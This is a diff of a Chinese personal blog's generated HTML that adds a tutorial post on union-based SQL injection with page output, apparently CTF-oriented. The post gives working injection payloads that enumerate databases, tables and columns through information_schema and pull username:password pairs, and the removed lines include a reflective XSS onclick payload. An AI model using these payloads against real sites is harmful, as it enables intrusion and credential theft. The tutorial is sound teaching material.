@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="有回显的SQL,">
 
 
 
@@ -79,16 +79,18 @@
 
 
 
-<meta name="description" content="It&apos;s my blog">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Seven">
-<meta property="og:url" content="http://yoursite.com/index.html">
+<meta name="description" content="准备知识1.元数据元数据是指数据库内部包含的数据，如数据库或表的名称、列的数据类型或访问权限MySQL服务器的元数据位于INFORMATION_SCHEMA虚拟数据库中。SQL Server可以通过INFORMATION_SCHEMA或系统表（sysobjects、sysindexkeys、sysindexes、syscolumns、systypes）及系统存储过程来访问元数据">
+<meta name="keywords" content="有回显的SQL">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql_1.md">
+<meta property="og:url" content="http://yoursite.com/2019/03/13/SQL-echo/index.html">
 <meta property="og:site_name" content="Seven">
-<meta property="og:description" content="It&apos;s my blog">
+<meta property="og:description" content="准备知识1.元数据元数据是指数据库内部包含的数据，如数据库或表的名称、列的数据类型或访问权限MySQL服务器的元数据位于INFORMATION_SCHEMA虚拟数据库中。SQL Server可以通过INFORMATION_SCHEMA或系统表（sysobjects、sysindexkeys、sysindexes、syscolumns、systypes）及系统存储过程来访问元数据">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-05-04T15:10:40.392Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Seven">
-<meta name="twitter:description" content="It&apos;s my blog">
+<meta name="twitter:title" content="sql_1.md">
+<meta name="twitter:description" content="准备知识1.元数据元数据是指数据库内部包含的数据，如数据库或表的名称、列的数据类型或访问权限MySQL服务器的元数据位于INFORMATION_SCHEMA虚拟数据库中。SQL Server可以通过INFORMATION_SCHEMA或系统表（sysobjects、sysindexkeys、sysindexes、syscolumns、systypes）及系统存储过程来访问元数据">
 
 
 
@@ -118,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/">
+  <link rel="canonical" href="http://yoursite.com/2019/03/13/SQL-echo/">
 
 
 
 
 
-  <title>Seven</title>
+  <title>sql_1.md | Seven</title>
   
 
 
@@ -143,8 +145,7 @@
     
   
 
-  <div class="container sidebar-position-left 
-  page-home">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -247,9 +248,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
 
   
 
@@ -279,9 +280,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/03/13/SQL-echo/" itemprop="url">sql_1.md</a></h1>
+          <h1 class="post-title" itemprop="name headline">sql_1.md</h1>
         
 
         <div class="post-meta">
@@ -353,18 +352,15 @@
       
 
       
-        
-          <h3 id="准备知识"><a href="#准备知识" class="headerlink" title="准备知识"></a><strong>准备知识</strong></h3><p>1.元数据<br>元数据是指数据库内部包含的数据，如数据库或表的名称、列的数据类型或访问权限<br>MySQL服务器的元数据位于INFORMATION_SCHEMA虚拟数据库中。<br>SQL Server可以通过INFORMATION_SCHEMA或系统表（sysobjects、sysindexkeys、sysindexes、syscolumns、systypes）及系统存储过程来访问元数据<br>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/03/13/SQL-echo/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
+        <h3 id="准备知识"><a href="#准备知识" class="headerlink" title="准备知识"></a><strong>准备知识</strong></h3><p>1.元数据<br>元数据是指数据库内部包含的数据，如数据库或表的名称、列的数据类型或访问权限<br>MySQL服务器的元数据位于INFORMATION_SCHEMA虚拟数据库中。<br>SQL Server可以通过INFORMATION_SCHEMA或系统表（sysobjects、sysindexkeys、sysindexes、syscolumns、systypes）及系统存储过程来访问元数据<br><a id="more"></a><br>2.information_schema 库中常用的表<br>SCHEMATA表：当前mysql实例中所有数据库的信息<br>TABLE表：存储数据库中的表信息（包括视图），包括表属于哪个数据库，表的类型、存储引擎、创建时间等信息。<br>COLUMNS 表：存储表中的列信息，包括表有多少列、每个列的类型等。<br><strong>基本步骤（有页面回显）</strong><br>一.找注入参数，判断是字符型还是字符型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=1 #显示正常（若为字符型则id=1&apos;,后面的单引号去闭合字符型参数的前面的单引号，后面也需要加注释符#或者-- &lt;后有一个空格&gt;来注释掉后面的单引号）</span><br><span class="line">?id=1 and 1=2 #显示不正常</span><br></pre></td></tr></table></figure></p>
+<p>二.判断字段个数<br><code>?id=1  order by XX</code><br>使页面显示正常的最后一个数字为字段个数，可用对半查找来缩小范围<br>三.判断字段精确位置<br>当union前面的语句为false时才会执行后面语句，所以union语句前，先构建一个错误条件。<br><code>?id=XX and 1=2 union select 1,2,3……</code><br>返回的数字可以在相应的位置处替换需要查询的参数，如下：<br>数据库名 database( )，管理员信息 user( )，用户名 username，密码 password，版本 version( )<br>还可以直接替换成相应的select语句（需要用括号包围），以下是几个常用的语句<br>爆所有数据名<br><code>select group_concat(SCHEMA_NAME) from information_schema.schemata</code><br>得到当前库的所有表<br><code>select group_concat(table_name) from information_schema.tables where table_schema=database()</code><br>得到表中的字段名 将敏感的表进行16进制编码adminuser=0x61646D696E75736572<br><code>select group_concat(column_name) from information_schema.columns where table_name=0x61646D696E75736572</code><br>得到字段具体的值<br><code>select group_concat(username,0x3a,password) from adminuser</code></p>
+<p>四.获取数据库名和用户名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=2 union select 1,database(),user()#</span><br><span class="line">或者</span><br><span class="line">?id=1 and 1=2 union select 1,2,SCHEMA_NAME from information_schema.SCHEMATA limit 1,1#</span><br><span class="line">limit 1,1表示选择第1个开始，只显示1个。</span><br></pre></td></tr></table></figure></p>
+<p>五.获取表名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=2 union select 1,2,TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,1#</span><br><span class="line">可以把database()改为查询出来的数据库名的十六进制，如 0x73716c5f6462（sql_db的十六进制）。</span><br><span class="line">数据库中有很多表，可以通过limit0，1或limit 1，1来控制</span><br></pre></td></tr></table></figure></p>
+<p>六.获取字段名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=2 Union select 1,2,COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=0x666c6167 limit 1,1#</span><br><span class="line">0x666c6167是表名flag的十六进制，limit 0,1可以看到字段id</span><br></pre></td></tr></table></figure></p>
+<p>七.字段内容<br><code>?id=1 and 1=2 union select 1,id,flag from flag#</code></p>
+
       
-    </p></div>
+    </div>
     
     
     
@@ -377,306 +373,36 @@
 
     <footer class="post-footer">
       
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/12/Reflective-XSS/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Seven">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/blog.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Seven">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/03/12/Reflective-XSS/" itemprop="url">Reflective XSS</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-12T20:32:33+08:00">
-                2019-03-12
-              </time>
-            
-
-            
-
-            
-          </span>
-
+        <div class="post-tags">
           
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/XSS/" itemprop="url" rel="index">
-                    <span itemprop="name">XSS</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
+            <a href="/tags/有回显的SQL/" rel="tag"># 有回显的SQL</a>
           
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
         </div>
-      </header>
-    
+      
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
+      
       
       
 
       
-        
-          <p>反射型XSS就是简单地把用户输入的数据直接反射给浏览器。<br>首先注意观察找输出点是标签或者是标签中的属性（比如form表单里面的触发属性）<br>尝试去闭合引号<br>    <code>&lt;a href=&#39; &#39; onclick=alert(/xss/)// &#39;&gt;link&lt;/a&gt;</code><br>或者是整个标签<br>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/03/12/Reflective-XSS/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/12/Reflective-XSS/" rel="next" title="Reflective XSS">
+                <i class="fa fa-chevron-left"></i> Reflective XSS
+              </a>
+            
           </div>
-          <!--/noindex-->
-        
-      
-    </p></div>
-    
-    
-    
 
-    
+          <span class="post-nav-divider"></span>
 
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/11/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Seven">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/blog.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Seven">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/03/11/hello-world/" itemprop="url">Hello World</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
+          <div class="post-nav-prev post-nav-item">
             
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-11T15:33:23+08:00">
-                2019-03-11
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Hexo/" itemprop="url" rel="index">
-                    <span itemprop="name">Hexo</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
+          </div>
         </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
       
-        
-          <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.<br>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/03/11/hello-world/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </p></div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
       
     </footer>
   </div>
@@ -686,10 +412,11 @@
   </article>
 
 
-    
-  </section>
 
-  
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -697,6 +424,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -717,8 +448,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -794,6 +534,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#准备知识"><span class="nav-number">1.</span> <span class="nav-text">准备知识</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -935,6 +691,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
